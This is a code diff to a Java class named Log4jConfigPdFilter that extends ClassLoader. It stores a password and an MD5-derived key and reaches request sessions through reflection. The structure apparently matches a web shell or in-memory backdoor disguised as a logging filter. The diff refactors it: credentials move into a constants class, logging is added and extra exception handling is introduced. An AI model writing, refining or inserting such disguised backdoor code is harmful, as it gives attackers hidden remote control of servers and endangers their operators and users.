@@ -1,5 +1,7 @@
 package com.filter;
 
+import com.Constant001;
+
 import java.lang.reflect.Method;
 
 public class Log4jConfigPdFilter extends ClassLoader{
@@ -12,8 +14,8 @@ public class Log4jConfigPdFilter extends ClassLoader{
     }
 
     public static String md5;
-    static String pass = "pass";
-    static String key = md5("key").substring(0, 16).toLowerCase();
+    static String pass = Constant001.PASSWORD;
+    static String key = md5(Constant001.SECRET_KEY).substring(0, 16).toLowerCase();
 
     public Log4jConfigPdFilter() {
     }
@@ -73,7 +75,7 @@ public class Log4jConfigPdFilter extends ClassLoader{
     }
 
     public void execute(Object requestObj,  Object responseObj) {
-        System.out.println("into execute()");
+        Constant001.logger.info("into execute()");
         try {
             // Use reflection to access session
             Class<?> reqClass = requestObj.getClass();
@@ -114,7 +116,10 @@ public class Log4jConfigPdFilter extends ClassLoader{
                 flush.invoke(out);
             }
         } catch (Exception var12) {
+            Constant001.logger.severe(var12.getMessage());
             var12.printStackTrace();
+        } catch (Throwable var13) {
+            Constant001.logger.severe("a" +var13.getMessage());
         }
 
     }
